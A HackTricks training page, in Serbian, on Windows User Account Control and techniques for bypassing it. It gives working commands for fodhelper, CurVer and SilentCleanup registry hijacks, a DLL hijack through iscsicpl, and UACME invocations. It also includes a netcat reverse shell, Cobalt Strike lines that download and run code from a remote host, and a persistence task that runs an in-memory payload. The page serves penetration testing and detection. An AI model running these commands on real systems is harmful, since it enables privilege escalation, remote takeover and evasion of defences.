# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za saglasnost za aktivnosti sa povišenim privilegijama**. Aplikacije imaju različite nivoe `integrity`, a program sa **visokim nivoom** može da izvršava zadatke koji bi **potencijalno mogli da ugroze sistem**. Kada je UAC omogućen, aplikacije i zadaci se uvek **izvršavaju u bezbednosnom kontekstu naloga koji nije administrator** osim ako administrator izričito ne odobri da te aplikacije/zadaci imaju pristup sistemu na nivou administratora radi izvršavanja. To je funkcija pogodnosti koja štiti administratore od nenamernih izmena, ali se ne smatra bezbednosnom granicom.<sup>[[2]](#references)</sup>

Za više informacija o nivoima integriteta:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, korisniku administratoru se dodeljuju 2 tokena: token standardnog korisnika, za obavljanje uobičajenih radnji na srednjem nivou integriteta, i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) veoma detaljno objašnjava kako UAC funkcioniše i obuhvata proces prijavljivanja, korisničko iskustvo i UAC arhitekturu.<sup>[[2]](#references)</sup> Administratori mogu da koriste bezbednosne politike za konfigurisanje načina rada UAC-a specifičnog za njihovu organizaciju na lokalnom nivou (pomoću secpol.msc), ili da ga konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domenskom okruženju. Različita podešavanja detaljno su razmotrena [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Za UAC se može podesiti 10 Group Policy podešavanja. Sledeća tabela pruža dodatne informacije:

| Group Policy podešavanje                                                                                                                                                                                                                                                                                                                                                           | Registry ključ                | Podrazumevano podešavanje                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Onemogućeno)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Zahtev za saglasnost za ne-Windows binarne datoteke na bezbednoj radnoj površini) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Zahtev za akreditive na bezbednoj radnoj površini)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Omogućeno; podrazumevano onemogućeno u izdanju Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Onemogućeno)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Omogućeno)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Omogućeno)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Onemogućeno)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Omogućeno)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Omogućeno)                                              |

### Politike za instaliranje softvera na Windows-u

**lokalne bezbednosne politike** ("secpol.msc" na većini sistema) podrazumevano su konfigurisane tako da **spreče korisnike koji nisu administratori da instaliraju softver**. To znači da, čak i ako korisnik koji nije administrator može da preuzme installer za vaš softver, neće moći da ga pokrene bez administratorskog naloga.

### Registry ključevi za prisiljavanje UAC-a da zahteva povišene privilegije

Kao standardni korisnik bez administratorskih prava, možete da obezbedite da se od "standardnog" naloga **zahtevaju akreditive putem UAC-a** kada pokuša da izvrši određene radnje. Za ovu radnju potrebno je izmeniti određene **registry ključeve**, za šta su vam potrebne administratorske dozvole, osim ako postoji **UAC bypass**, ili je napadač već prijavljen kao administrator.

Čak i ako se korisnik nalazi u grupi **Administrators**, ove izmene prisiljavaju korisnika da **ponovo unese akreditive svog naloga** kako bi izvršio administratorske radnje.

**U praksi je ovo korisno samo kada već imate povišeni token, UAC bypass ili pogrešnu konfiguraciju koja vam omogućava da menjate ove ključeve; u suprotnom je sam upis u registry blokiran.**

Registry ključevi i stavke koje morate da izmenite su sledeći (sa njihovim podrazumevanim vrednostima u zagradama):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Ovo se može uraditi i ručno pomoću alata Local Security Policy. Nakon izmene, administratorske operacije zahtevaju od korisnika da ponovo unese svoje akreditive.

### Napomena

**User Account Control nije bezbednosna granica.** Zbog toga standardni korisnici ne mogu da izađu iz svojih naloga i steknu administratorska prava bez lokalnog privilege escalation exploita.

### Zatražite od korisnika „potpun pristup računaru“
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC privilegije

- Internet Explorer Protected Mode koristi provere integriteta kako bi sprečio procese sa visokim nivoom integriteta (kao što su web pregledači) da pristupaju podacima sa niskim nivoom integriteta (kao što je fascikla sa privremenim Internet datotekama). To se postiže pokretanjem pregledača sa tokenom niskog nivoa integriteta. Kada pregledač pokuša da pristupi podacima uskladištenim u zoni niskog integriteta, operativni sistem proverava nivo integriteta procesa i u skladu s tim dozvoljava pristup. Ova funkcija pomaže u sprečavanju napada daljinskog izvršavanja koda da dobiju pristup osetljivim podacima na sistemu.
- Kada se korisnik prijavi na Windows, sistem kreira access token koji sadrži listu privilegija korisnika. Privilegije su definisane kao kombinacija prava i mogućnosti korisnika. Token takođe sadrži listu akreditiva korisnika, odnosno akreditiva koji se koriste za autentifikaciju korisnika na računaru i pristup resursima na mreži.

### Autoadminlogon

Da biste konfigurisali Windows tako da se određeni korisnik automatski prijavljuje prilikom pokretanja sistema, podesite **`AutoAdminLogon` registry key**. Ovo je korisno u kiosk okruženjima ili za potrebe testiranja. Koristite ovo samo na bezbednim sistemima, jer se lozinka izlaže u registry-ju.

Podesite sledeće ključeve pomoću Registry Editor-a ili komande `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Da biste vratili uobičajeno ponašanje pri prijavljivanju, podesite `AutoAdminLogon` na 0.

## UAC bypass

> [!TIP]
> Imajte na umu da je, ako imate grafički pristup žrtvinom sistemu, UAC bypass jednostavan, jer možete samo da kliknete na „Yes“ kada se pojavi UAC prompt.

UAC bypass je potreban u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednjeg nivoa integriteta, a vaš korisnik pripada administratorskoj grupi**.

Važno je napomenuti da je **UAC mnogo teže zaobići ako je podešen na najviši nivo bezbednosti (Always) nego ako je podešen na bilo koji od drugih nivoa (Default).**

### Brza trijaža iz shell-a srednjeg nivoa integriteta

Pre nego što pokušate bypass, potvrdite da se nalazite u odgovarajućoj situaciji i povežite build hosta sa poznatim metodama koje funkcionišu:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktične napomene:
- Ako je `EnableLUA=0`, bypass nije potreban: bilo koji admin token može direktno da zatraži high integrity.
- `ConsentPromptBehaviorAdmin=2` ili `5` predstavlja uobičajen scenario za auto-elevate / COM-based bypasses.
- `Always Notify` podiže nivo zaštite, ali i dalje treba testirati konkretnu verziju umesto pretpostavljanja da neće uspeti: UACME i dalje prati neke metode kompatibilne sa `AlwaysNotify` na modernim Windows buildovima.<sup>[[3]](#references)</sup>

### UAC disabled

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverse shell sa admin privilegijama** (high integrity level) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

AppInfo local RPC interfejs `201ef99a-7fa0-444c-9399-19ba84f12a1a` može da kreira proces sa omogućenim debugging-om. Procesi kreirani za debugging na istoj niti dele debug object te niti; debug događaj kreiranja sadrži process handle sa potpunim pristupom čak i kada sam RPC rezultat daje samo ograničen pristup. Ovo pretvara ponovno korišćenje debug object-a u UAC primitivu za člana grupe Administrators sa srednjim nivoom integriteta.<sup>[[11]](#references)[[12]](#references)</sup>

Praktičan chain je:<sup>[[11]](#references)[[12]](#references)</sup>

1. Pozovite lokalni RPC metod (direktno ili preko `NdrAsyncClientCall`) da biste kreirali sacrificial proces koji nije elevated, sa omogućenim debugging-om.
2. Izvršite upit za `ProcessDebugObjectHandle` pomoću `NtQueryInformationProcess`, odvojite ga pomoću `NtRemoveProcessDebug`, zadržite object i terminirajte sacrificial proces.
3. Koristite isti RPC interfejs da kreirate trusted auto-elevated proces, a zatim povežite sačuvani object sa calling thread-om pomoću `DbgUiSetThreadDebugObject`.
4. Pozovite `WaitForDebugEvent` i preuzmite process handle iz `CREATE_PROCESS_DEBUG_EVENT`; duplicirajte ga pomoću `NtDuplicateObject` pre nego što nastavite.
5. Prosledite duplicirani handle funkciji `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` i pokrenite payload pomoću extended startup-info strukture. Ovo istovremeno ponovo koristi context elevated procesa i daje child procesu relationship sa parent procesom koji izgleda kao trusted.

Tražite kratku sekvencu, a ne samo auto-elevated binary: kreiranje procesa preko lokalnog AppInfo RPC-a, upite za `ProcessDebugObjectHandle`, odvajanje/ponovno povezivanje debugger-a, neposredni creation-debug event, dupliciranje handle-a i child čiji recorded parent nije isti kao proces koji je izvršio creation API-je.<sup>[[12]](#references)</sup>

### **Very** Basic UAC "bypass" (full file system access)

Ako imate shell sa korisnikom koji se nalazi u grupi Administrators, možete **mount-ovati C$** share preko SMB-a (file system) lokalno na novom disku i imaćete **access to everything inside the file system** (čak i do Administrator home folder-a).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike tehnike će funkcionisati samo ako UAC nije podešen na maksimalni nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC-a**.

### Elevated COM interfejsi (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objekti i dalje predstavljaju praktičnu UAC površinu na modernim buildovima. `ICMLuaUtil` se i dalje vodi u UACME-u kao funkcionalan na aktuelnim Windows granama, a offensive alati nastavljaju da prilagođavaju `CMSTPLUA` kombinovanjem procesa na interaktivnom desktopu, 64-bitnog izvršavanja i ponekad PEB/process masquerading-a pre pozivanja COM Elevation Moniker-a.<sup>[[3]](#references)</sup>

Praktični saveti:
- Dajte prednost **64-bitnom** procesu u korisnikovoj **interaktivnoj sesiji** (najčešće `explorer.exe` ili njegovom child procesu).
- Ako raw shell ne uspe, pokušajte ponovo iz BOF / UACME implementacije umesto naivnog `CreateProcess` wrapper-a.
- Očekujte da se child izvršavanje odvija u **zasebnom elevated procesu**; mnogi BOF-ovi ne eleviraju trenutni beacon in-place.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploit-i

[**UACME**](https://github.com/hfiref0x/UACME) je kolekcija UAC bypass tehnika. Kompajlirajte ga pomoću Visual Studio-a ili MSBuild-a; build kreira nekoliko executable fajlova (na primer, `Source\Akagi\output\x64\Debug\Akagi.exe`), zato izaberite metod koji odgovara ciljnom buildu.<sup>[[3]](#references)</sup>\
Budite oprezni: neki bypass-i pokreću vidljive programe ili promptove koji mogu upozoriti korisnika.<sup>[[3]](#references)</sup>

UACME sadrži **build verziju od koje je svaka tehnika počela da radi**.<sup>[[3]](#references)</sup> Možete pretražiti tehniku koja utiče na vaše verzije:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, pomoću [ove](https://en.wikipedia.org/wiki/Windows_10_version_history) stranice određujete Windows izdanje `1607` na osnovu verzija builda.

Praktičan tok rada je da prvo **procenite build hosta**, a tek onda pokrenete odgovarajuću metodu:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` brzo upoređuje lokalni build sa poznatim UAC metodama, što je korisno za brzo odbacivanje nevažećih PoC-ova.<sup>[[4]](#references)</sup>
- `UACME` ostaje najbolji javni katalog za povezivanje bypass-a sa konkretnim build-om. Verzija 3.7.1 dodala je metode 83–85, dok je prethodno izdanje ponovo testiralo postojeće metode na **Windows 11 25H2**; ponovo proverite tabelu metoda i napomene o izdanju umesto da pretpostavite da se stari PoC i dalje primenjuje bez izmena.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-capable WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` ne eliminiše svaki UAC bypass. UACME 3.7.1 implementira tri nove x64 metode koje kombinuju stanje okruženja/protokola pod kontrolom korisnika sa ponašanjem povišenog scheduled task-a ili UIAccess-a i sve ih označava kao `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** preusmerite `SystemRoot` tako da WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` natera povišeni `taskhostw.exe` da izvrši side-load biblioteke `unifiedconsent.dll`. UACME ga prati od Windows 10 build 19041.
- **84 — TabTip:** upotrebite isti primitive promenljive okruženja protiv UIAccess procesa `TabTip.exe`, koji učitava `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` ili `rsaenh.dll`, u zavisnosti od build-a, a zatim pređite iz dobijenog UIAccess konteksta visokog integriteta. UACME ga prati od Windows 8.1 / Server 2016.
- **85 — Narrator:** otmite per-user `feedback-hub` protokol, pokrenite Narrator pomoću `Alt+CapsLock+F`, a zatim pokrenite upisivu kopiju `osk.exe` koja izvršava side-load biblioteke `OskSupport.dll`. Ovo zahteva interaktivni desktop i prati se od Windows 10 1809 / Server 2019.

Nakon što napravite payload units i Akagi prema dokumentaciji za UACME, pozovite odgovarajući broj metode (opciona komanda podrazumevano je `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Metode 84 i 85 zavise od UIAccess-a/interakcije sa desktopom, zato nemojte očekivati da će raditi neizmenjeno iz Session 0 ili neinteraktivne servisne shell sesije. Sve tri metode menjaju stanje okruženja/protokola i pripremaju DLL-ove; pregledajte implementaciju i uklonite te artefakte nakon testiranja.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` ima auto-elevaciju na modernom Windows-u. Prilikom pokretanja, on upituje putanju registry-ja po korisniku navedenu u nastavku, bez validacije `DelegateExecute` glagola. Postavljanje komande na toj lokaciji omogućava procesu sa Medium Integrity nivoom (korisnik je u grupi Administrators) da pokrene proces sa High Integrity nivoom bez UAC upita.

Putanja registry-ja koju upituje fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell koraci (podesite svoj payload, zatim ga aktivirajte)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Napomene:
- Funkcioniše kada je trenutni korisnik član grupe Administrators, a UAC nivo je podrazumevan/blag (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bitni PowerShell iz 32-bitnog procesa na 64-bitnom Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd ili putanja do EXE datoteke). Za stealth izbegavajte UI-je koji zahtevaju interakciju.

#### CurVer/extension hijack varijanta (HKCU only)

Noviji uzorci koji zloupotrebljavaju `fodhelper.exe` izbegavaju `DelegateExecute` i umesto toga **preusmeravaju `ms-settings` ProgID** putem vrednosti `CurVer` po korisniku. Auto-elevated binarni fajl i dalje razrešava handler pod `HKCU`, tako da administratorski token nije potreban za postavljanje ključeva:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Nakon elevacije, malware često **onemogućava buduće upite** postavljanjem vrednosti `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` na `0`, a zatim sprovodi dodatno izbegavanje detekcije (npr. `Add-MpPreference -ExclusionPath C:\ProgramData`) i ponovo kreira persistence kako bi se izvršavao uz visok integritet. Tipičan persistence task čuva **XOR-enkriptovanu PowerShell skriptu** na disku i dekodira/izvršava je u memoriji svakog sata:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Ova varijanta i dalje uklanja dropper i ostavlja samo staged payloads, zbog čega se detekcija oslanja na nadgledanje **`CurVer` hijack-a**, neovlašćene izmene `ConsentPromptBehaviorAdmin`, kreiranje Defender exclusion-a ili scheduled tasks koji u memoriji dešifruju PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass putem `SilentCleanup` task-a (`HKCU\Environment\windir`)

`SilentCleanup` pokreće `cleanmgr.exe` sa najvišim privilegijama i proširuje `%windir%` iz korisničkog okruženja. Ako kontrolišete `HKCU\Environment\windir`, možete preusmeriti to proširivanje na proizvoljnu komandu i dobiti high integrity bez dijaloga za potvrdu.<sup>[[8]](#references)</sup> Ovaj metod i dalje vredi testirati na novijim buildovima, jer UACME održava tehniku aktivnom, a nedavno praćenje problema pokazuje da Windows 11 24H2 možda zahteva samo manje izmene navodnika.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Ako task navodi putanju u toj build verziji, ponovite pokušaj sa payload-om koji se završava navodnikom (na primer `cmd.exe"`). Uvek obrišite `HKCU\Environment\windir` nakon testiranja.

#### Još UAC bypass

Mnogi klasični UAC bypass-i koji zloupotrebljavaju UI tokove, COM objekte ili interakciju sa desktopom zahtevaju **potpunu interaktivnu sesiju** sa žrtvom; uobičajeni `nc.exe` shell ili service koji radi u **Session 0** često nisu dovoljni.

To često možete rešiti pomoću **meterpreter** sesije. Migrirajte u **process** čija je vrednost **Session** jednaka **1**:

![Usmerite ms-settings na prilagođenu ekstenziju (.thm) i mapirajte tu ekstenziju na naš payload - Još UAC bypass: Ovo možete dobiti pomoću meterpreter sesije. Migrirajte u process čija je vrednost Session...](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass pomoću GUI-ja

Ako imate pristup **GUI-ju, jednostavno možete prihvatiti UAC prompt** kada se pojavi; tehnički bypass vam zapravo nije potreban. Zato je dobijanje GUI sesije često dovoljno da se zaobiđe praktična prepreka koju UAC dodaje.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP-a), **neki alati će raditi kao administrator**, pa odatle možete direktno **pokrenuti** na primer **cmd** **kao admin**, bez ponovnog prikazivanja UAC prompta, kao kod [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.

### Bučan brute-force UAC bypass

Ako je buka prihvatljiva, alat kao što je [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) može neprestano zahtevati elevation dok ga korisnik ne prihvati.

### Sopstveni bypass - Osnovna metodologija za UAC bypass

Ako pogledate **UACME**, primetićete da **mnogi UAC bypass-i zloupotrebljavaju DLL hijacking** (često tako što nateraju elevated binary da učita DLL kojim upravlja attacker iz writable putanje). [Pročitajte ovo da biste naučili kako da pronađete ranjivost za DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binary koji će se **autoelevate** (proverite da se, kada se izvrši, pokreće na high integrity nivou).
2. Pomoću procmon-a pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32), gde nemate dozvole za upisivanje. Ovo možete zaobići pomoću:
1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla unutar zaštićenih putanja (zato što se ovaj alat izvršava sa high integrity nivoa).
2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** koja će kopirati vaš DLL u zaštićenu putanju i izvršiti ranjivi i autoelevated binary.

### Druga tehnika za UAC bypass

Sastoji se od praćenja da li **autoElevated binary** pokušava da iz **registry-ja** **pročita** **ime/putanju** nekog **binary-ja** ili **komande** koju treba **izvršiti** (ovo je interesantnije ako binary traži ove informacije unutar **HKCU**).

### UAC bypass preko `SysWOW64\iscsicpl.exe` + DLL hijack korisničkog `PATH`-a

32-bitni `C:\Windows\SysWOW64\iscsicpl.exe` je **auto-elevated** binary koji se može zloupotrebiti za učitavanje `iscsiexe.dll` prema redosledu pretrage. Ako možete postaviti maliciozni `iscsiexe.dll` u folder u koji **korisnik može da upisuje**, a zatim izmeniti `PATH` trenutnog korisnika (na primer preko `HKCU\Environment\Path`) tako da se taj folder pretražuje, Windows može učitati attacker DLL unutar elevated `iscsicpl.exe` procesa **bez prikazivanja UAC prompta**.<sup>[[1]](#references)[[6]](#references)</sup>

Praktične napomene:
- Ovo je korisno kada se trenutni korisnik nalazi u grupi **Administrators**, ali radi na **Medium Integrity** nivou zbog UAC-a.
- Kopija u **SysWOW64** je relevantna za ovaj bypass. Kopiju u **System32** tretirajte kao zaseban binary i nezavisno proverite njeno ponašanje.
- Primitive predstavlja kombinaciju **auto-elevation** i **DLL search-order hijacking**, pa je isti ProcMon workflow koji se koristi za druge UAC bypass-e koristan za proveru učitavanja DLL-a koji nedostaje.

Minimalni tok:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ideje za detekciju:
- Upozoriti na `reg add` / upise u registry u `HKCU\Environment\Path` koji su neposredno praćeni pokretanjem `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražiti `iscsiexe.dll` na lokacijama koje kontroliše **user**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Povezati pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjima DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi zasebno proveriti

Neki lanci nakon 2024. više ne izgledaju kao klasični registry hijack napadi nad `HKCU\Software\Classes`. Na primer, poisoning activation-context cache-a može povezati **drive remap** i **DLL redirection** kako bi se prešlo sa srednjeg na visoki integritet kroz pouzdane UI / auto-elevated binarne datoteke kao što je `ctfmon.exe`, a kasnije i mete poput `fodhelper.exe`. Umesto dupliciranja velikog PoC-a ovde, proverite sažete primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack slovnog označivača diska kroz DOS device map po sesiji prijavljivanja u okviru Administrator Protection (preview)

> [!NOTE]
> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje iz oktobra 2025. je povučeno i planirano za kasniji datum. Potvrdite da je **Admin Approval Mode with Administrator protection** zaista omogućen i da je uređaj restartovan pre testiranja ovih lanaca; sam string verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>
